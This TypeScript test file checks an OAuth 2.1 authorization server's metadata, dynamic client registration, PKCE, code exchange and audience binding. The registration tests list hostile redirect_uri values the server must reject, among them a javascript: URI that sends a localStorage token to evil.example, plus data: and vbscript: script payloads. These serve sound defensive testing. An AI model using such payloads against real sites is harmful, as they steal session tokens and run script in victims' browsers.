/**
 * Stage 3 — OAuth 2.1 authorization server: metadata, DCR, the full
 * authorize → consent decision → token exchange, PKCE + audience enforcement,
 * and the notable failure modes.
 */

import { describe, expect, test, beforeEach } from 'vitest';
import { Hono } from 'hono';
import { Database } from '../../src/engine/sqlite';
import { generateId, generateToken, nowRFC3339 } from '../../src/engine/ids';
import { createUserTables, insertUser } from '../../src/engine/users';
import type { User } from '../../src/engine/types';
import { TYPE_REGULAR } from '../../src/engine/types';
import { AuthService } from '../../src/auth/service';
import type { AuthServerConfig } from '@rambleraptor/homestead-core/apps/config';
import { createOAuthTables, insertClient } from '../../src/auth/oauth/storage';
import { makeOAuthServerRoutes } from '../../src/auth/oauth/routes';
import { makeWellKnownRoutes, protectedResourceMetadata } from '../../src/auth/oauth/metadata';
import { s256Challenge, verifyChallenge } from '../../src/auth/oauth/pkce';
import { verifyAccessToken } from '../../src/auth/oauth/verify';

const CFG: AuthServerConfig = {
  enabled: true,
  issuerUrl: 'https://home.example.com',
  scopesSupported: ['homestead'],
};

interface Harness {
  db: Database;
  auth: AuthService;
  app: Hono;
  user: User;
  sessionToken: string;
}

function harness(): Harness {
  const db = new Database(':memory:');
  createUserTables(db);
  createOAuthTables(db);
  const auth = new AuthService(db);
  const app = new Hono();
  app.route('/.well-known', makeWellKnownRoutes(CFG));
  app.route('/oauth2', makeOAuthServerRoutes(db, auth, CFG));

  const id = generateId();
  const now = nowRFC3339();
  const user: User = {
    id,
    path: `users/${id}`,
    email: 'member@example.com',
    type: TYPE_REGULAR,
    create_time: now,
    update_time: now,
  };
  insertUser(db, user, 'x');
  const sessionToken = auth.issueSession(id).access_token;
  return { db, auth, app, user, sessionToken };
}

function req(app: Hono, path: string, init?: RequestInit): Promise<Response> {
  return Promise.resolve(app.request(path, init));
}

async function registerClient(app: Hono, redirectUri: string): Promise<string> {
  const res = await req(app, '/oauth2/register', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ redirect_uris: [redirectUri], client_name: 'Test App' }),
  });
  expect(res.status).toBe(201);
  return ((await res.json()) as { client_id: string }).client_id;
}

/** Drive authorize → decision(approve) → return the issued code. */
async function getAuthCode(
  h: Harness,
  clientId: string,
  redirectUri: string,
  challenge: string,
  resource?: string,
): Promise<string> {
  const authorizeUrl =
    `/oauth2/authorize?response_type=code&client_id=${clientId}` +
    `&redirect_uri=${encodeURIComponent(redirectUri)}` +
    `&code_challenge=${challenge}&code_challenge_method=S256&state=st` +
    (resource ? `&resource=${encodeURIComponent(resource)}` : '');
  const authRes = await req(h.app, authorizeUrl);
  expect(authRes.status).toBe(302);
  const loc = authRes.headers.get('Location')!;
  const requestId = new URL(loc, 'https://home.example.com').searchParams.get('request')!;
  expect(requestId).toBeTruthy();

  const decisionRes = await req(h.app, '/oauth2/authorize/decision', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${h.sessionToken}` },
    body: JSON.stringify({ request: requestId, approve: true }),
  });
  expect(decisionRes.status).toBe(200);
  const redirect = ((await decisionRes.json()) as { redirect: string }).redirect;
  const u = new URL(redirect);
  expect(u.searchParams.get('state')).toBe('st');
  return u.searchParams.get('code')!;
}

async function exchangeCode(
  app: Hono,
  clientId: string,
  redirectUri: string,
  code: string,
  verifier: string,
): Promise<Response> {
  const form = new URLSearchParams({
    grant_type: 'authorization_code',
    code,
    redirect_uri: redirectUri,
    client_id: clientId,
    code_verifier: verifier,
  });
  return req(app, '/oauth2/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: form.toString(),
  });
}

describe('PKCE', () => {
  test('S256 verifies a matching verifier and rejects a tampered one', async () => {
    const verifier = 'a'.repeat(64);
    const challenge = await s256Challenge(verifier);
    expect(await verifyChallenge(verifier, challenge)).toBe(true);
    expect(await verifyChallenge('b'.repeat(64), challenge)).toBe(false);
    expect(await verifyChallenge(verifier, '')).toBe(false);
  });
});

describe('metadata', () => {
  test('AS metadata advertises the endpoints and S256', async () => {
    const h = harness();
    const res = await req(h.app, '/.well-known/oauth-authorization-server');
    expect(res.status).toBe(200);
    const meta = (await res.json()) as Record<string, unknown>;
    expect(meta.issuer).toBe('https://home.example.com');
    expect(meta.authorization_endpoint).toBe('https://home.example.com/oauth2/authorize');
    expect(meta.token_endpoint).toBe('https://home.example.com/oauth2/token');
    expect(meta.registration_endpoint).toBe('https://home.example.com/oauth2/register');
    expect(meta.code_challenge_methods_supported).toEqual(['S256']);
    expect(res.headers.get('Access-Control-Allow-Origin')).toBe('*');
  });

  test('protected-resource metadata points back at the issuer', () => {
    const prm = protectedResourceMetadata(CFG, 'https://home.example.com/api/mcp');
    expect(prm.resource).toBe('https://home.example.com/api/mcp');
    expect(prm.authorization_servers).toEqual(['https://home.example.com']);
  });
});

describe('dynamic client registration', () => {
  test('a public client is registered with no secret and auth method none', async () => {
    const h = harness();
    const res = await req(h.app, '/oauth2/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ redirect_uris: ['https://client.example/cb'] }),
    });
    expect(res.status).toBe(201);
    const body = (await res.json()) as Record<string, unknown>;
    expect(body.client_id).toBeTruthy();
    expect(body.client_secret).toBeUndefined();
    expect(body.token_endpoint_auth_method).toBe('none');
  });

  test.each([
    'javascript:fetch("//evil.example?"+localStorage.getItem("t"))',
    'JavaScript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    'http://client.example/cb',
    'https://client.example/cb#frag',
    'not a uri',
  ])('a redirect_uri the consent page must not navigate to is rejected: %s', async (uri) => {
    const h = harness();
    const res = await req(h.app, '/oauth2/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ redirect_uris: ['https://client.example/ok', uri] }),
    });
    expect(res.status).toBe(400);
    expect(((await res.json()) as { error: string }).error).toBe('invalid_redirect_uri');
  });

  test.each([
    'http://localhost:33418/callback',
    'http://127.0.0.1:8080/cb',
    'http://[::1]/cb',
    'com.example.app:/oauth/cb',
    'vscode://publisher.ext/cb',
  ])('a native-app redirect_uri is accepted: %s', async (uri) => {
    const h = harness();
    const res = await req(h.app, '/oauth2/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ redirect_uris: [uri] }),
    });
    expect(res.status).toBe(201);
  });

  test('missing redirect_uris is rejected', async () => {
    const h = harness();
    const res = await req(h.app, '/oauth2/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ client_name: 'No redirects' }),
    });
    expect(res.status).toBe(400);
  });
});

describe('authorization-code flow', () => {
  const REDIRECT = 'https://client.example/cb';
  let h: Harness;
  let clientId: string;
  const verifier = 'verifier-verifier-verifier-verifier-1234567890';

  beforeEach(async () => {
    h = harness();
    clientId = await registerClient(h.app, REDIRECT);
  });

  test('happy path: authorize → approve → token, and the token validates', async () => {
    const challenge = await s256Challenge(verifier);
    const code = await getAuthCode(h, clientId, REDIRECT, challenge);
    const res = await exchangeCode(h.app, clientId, REDIRECT, code, verifier);
    expect(res.status).toBe(200);
    const tok = (await res.json()) as {
      access_token: string;
      token_type: string;
      refresh_token: string;
      expires_in: number;
    };
    expect(tok.token_type).toBe('Bearer');
    expect(tok.expires_in).toBeGreaterThan(0);
    expect(h.auth.validateAccessToken(tok.access_token)?.id).toBe(h.user.id);
    // refresh_token grant rotates to a new working access token.
    const refreshed = await req(h.app, '/oauth2/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        grant_type: 'refresh_token',
        refresh_token: tok.refresh_token,
      }).toString(),
    });
    expect(refreshed.status).toBe(200);
    const rt = (await refreshed.json()) as { access_token: string };
    expect(h.auth.validateAccessToken(rt.access_token)?.id).toBe(h.user.id);
  });

  test('a wrong PKCE verifier is rejected as invalid_grant', async () => {
    const challenge = await s256Challenge(verifier);
    const code = await getAuthCode(h, clientId, REDIRECT, challenge);
    const res = await exchangeCode(h.app, clientId, REDIRECT, code, 'the-wrong-verifier');
    expect(res.status).toBe(400);
    expect(((await res.json()) as { error: string }).error).toBe('invalid_grant');
  });

  test('a code cannot be exchanged twice', async () => {
    const challenge = await s256Challenge(verifier);
    const code = await getAuthCode(h, clientId, REDIRECT, challenge);
    const first = await exchangeCode(h.app, clientId, REDIRECT, code, verifier);
    expect(first.status).toBe(200);
    const second = await exchangeCode(h.app, clientId, REDIRECT, code, verifier);
    expect(second.status).toBe(400);
  });

  test('a client registered before the rule with a javascript: redirect gets an error page', async () => {
    const evil = 'javascript:alert(document.domain)';
    insertClient(h.db, {
      client_id: 'legacy-client',
      client_secret: null,
      redirect_uris: [evil],
      client_name: 'Legacy',
      token_endpoint_auth_method: 'none',
      grant_types: ['authorization_code'],
    });
    const challenge = await s256Challenge(verifier);
    const res = await req(
      h.app,
      `/oauth2/authorize?response_type=code&client_id=legacy-client` +
        `&redirect_uri=${encodeURIComponent(evil)}` +
        `&code_challenge=${challenge}&code_challenge_method=S256`,
    );
    expect(res.status).toBe(400);
    expect(res.headers.get('location')).toBeNull();
  });

  test('an unregistered redirect_uri renders an error page (no redirect)', async () => {
    const challenge = await s256Challenge(verifier);
    const res = await req(
      h.app,
      `/oauth2/authorize?response_type=code&client_id=${clientId}` +
        `&redirect_uri=${encodeURIComponent('https://evil.example/cb')}` +
        `&code_challenge=${challenge}&code_challenge_method=S256`,
    );
    expect(res.status).toBe(400);
    expect(res.headers.get('Content-Type')).toContain('text/html');
    expect(res.headers.get('Location')).toBeNull();
  });

  test('missing PKCE redirects to the client with invalid_request', async () => {
    const res = await req(
      h.app,
      `/oauth2/authorize?response_type=code&client_id=${clientId}` +
        `&redirect_uri=${encodeURIComponent(REDIRECT)}&state=st`,
    );
    expect(res.status).toBe(302);
    const u = new URL(res.headers.get('Location')!);
    expect(u.searchParams.get('error')).toBe('invalid_request');
    expect(u.searchParams.get('state')).toBe('st');
  });

  test('the decision endpoint requires an authenticated user', async () => {
    const challenge = await s256Challenge(verifier);
    const authRes = await req(
      h.app,
      `/oauth2/authorize?response_type=code&client_id=${clientId}` +
        `&redirect_uri=${encodeURIComponent(REDIRECT)}` +
        `&code_challenge=${challenge}&code_challenge_method=S256`,
    );
    const requestId = new URL(authRes.headers.get('Location')!, 'https://home.example.com')
      .searchParams.get('request')!;
    const res = await req(h.app, '/oauth2/authorize/decision', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ request: requestId, approve: true }),
    });
    expect(res.status).toBe(401);
  });
});

describe('audience binding (RFC 8707)', () => {
  test('verifyAccessToken enforces the resource the token was issued for', async () => {
    const h = harness();
    const redirect = 'https://client.example/cb';
    const clientId = await registerClient(h.app, redirect);
    const verifier = 'verifier-for-audience-test-000000000000';
    const challenge = await s256Challenge(verifier);
    const resource = 'https://home.example.com/api/mcp';
    const code = await getAuthCode(h, clientId, redirect, challenge, resource);
    const tok = (await (
      await exchangeCode(h.app, clientId, redirect, code, verifier)
    ).json()) as { access_token: string };

    const bearer = (t: string) =>
      new Request('https://home.example.com/api/mcp', {
        headers: { Authorization: `Bearer ${t}` },
      });

    // Matching audience → verified; wrong audience → rejected.
    expect(verifyAccessToken(h.db, bearer(tok.access_token), { audience: resource })?.user.id).toBe(
      h.user.id,
    );
    expect(
      verifyAccessToken(h.db, bearer(tok.access_token), { audience: 'https://other/resource' }),
    ).toBeNull();
    // A plain login token has no audience binding → rejected for a scoped resource.
    expect(
      verifyAccessToken(h.db, bearer(h.sessionToken), { audience: resource }),
    ).toBeNull();
  });
});
